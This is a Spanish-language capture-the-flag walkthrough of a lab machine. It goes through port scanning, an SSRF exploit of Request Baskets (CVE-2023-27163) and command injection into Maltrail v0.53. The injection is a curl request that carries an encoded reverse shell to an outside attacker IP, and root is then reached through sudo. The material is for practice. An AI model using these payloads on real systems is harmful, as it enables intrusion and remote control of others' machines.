- Realizamos un scaneo de puertos en la maquina victima
  ```bash
  sudo nmap -p- -sS --min-rate 5000 -vvv -n -Pn 10.10.11.224
```
![[Pasted image 20230925135641.png]]

- ahora vamos a analizar los puertos que ha dado de forma mas exhaustiva
  ```bash
  sudo nmap -p22,55555,80,8338 -sCV --min-rate 5000 -vvv 10.10.11.224
```
	podemos ver que el puerto 80 y 8338 estan filtrados, asi que vamos a ver el resto, podemos ver que el 55555 esta abierto y si nos fijamos podemos ver que la "GetRequest" funciona.![[Pasted image 20230925135839.png]]
- vamos a una usar un navegador para ver la web
  ![[Pasted image 20230925135941.png]]

- Esto es un basket es decir es un servicio al que ponemos mandar peticiones http y las podemos ver o redirigirlas, en este caso sabemos la  version de "request basket" la "1.2.1" y tiene exploit, no obstante hay otra forma de de entrar al sistema, que es usando el "Forward" para mandar una peticion http al servidor que esta corriendo en el puerto 80 y de esta forma hacer "Directory Listing" y veremos que hay una web llamda login, veremos las dos opciones
- vamos a descargar el exploit, y lo ejecutamos:https://github.com/entr0pie/CVE-2023-27163
  el script no es necesaario pero es mas comodo
  ```bash
  ./CVE-2023-27163.sh http://10.10.11.224:55555/ http://127.0.0.1:80/
```
  ![[Pasted image 20230928122808.png]]
  Podemos ver que si entramos en:![[Pasted image 20230928122824.png]]
 - podemos ver la web que hay en el equipo victima
	![[Pasted image 20230928122957.png]]
	Vemos la version del servicio que es "Maltrail v0.53" veamos si tiene algun exploit, hemos encontrado uno que junta "request basket" y "mailtrail " : https://github.com/HusenjanDev/CVE-2023-27163-AND-Mailtrail-v0.53
	y otro que solo explota "Mailtrail" https://github.com/spookier/Maltrail-v0.53-Exploit
	
- no obstante vamos a hacerlo a mano, usando el comando y previamente poniendonos en escucha por el puerto que hayamos puesto:
  ```bash
  curl http://10.10.11.224:55555/fpdq59o -d 'username=;\"echo c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTYuMTA4LzQ0NDQgMD4mMDEK | base64 -d | bash\`"
```
	- ` ; `: El punto y coma se utiliza para separar comandos en una línea de comandos. Cuando se encuentra un punto y coma, el intérprete de comandos ejecuta el comando anterior y luego pasa al siguiente comando.
    
	- `` ` ``: Las comillas invertidas (también conocidas como acentos graves) se utilizan para ejecutar un comando en una subshell y capturar su salida. El comando entre las comillas invertidas se ejecuta y su salida se sustituye en la línea de comandos.
	- `\` : se usa para que se ejecute de forma literal
- Ya tenemos una terminal apuntando la maquina victima por lo que hacemos un [[Tratamiento de la tty]], una vez hecho debemos hacer una escalada de privilegios, vamos ver si el usuario tiene permiso para ejecutar comandos como [[sudo]]
  ![[Pasted image 20231002135226.png]]
- vamos a Ejecutar el servicio y vamos a intentar [[Ejecutar comandos en servicios]]
  ![[Pasted image 20231002135521.png]]
- una vez somos root ya podemos ver la flag 